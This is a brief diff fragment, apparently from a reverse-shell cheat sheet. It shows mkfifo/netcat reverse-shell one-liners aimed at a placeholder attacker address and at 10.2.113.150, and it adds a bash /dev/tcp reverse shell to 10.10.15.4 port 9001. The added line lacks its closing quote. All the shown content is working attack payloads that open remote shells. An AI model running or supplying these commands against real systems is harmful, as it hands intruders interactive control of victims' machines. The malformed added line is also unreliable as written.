@@ -74,6 +74,7 @@ mkfifo /tmp/f; nc <ATTACK-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 
 ```sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.113.150 9001 >/tmp/f
+bash -c 'bash -i >& /dev/tcp/10.10.15.4/9001 0>&1
 ```
 
 
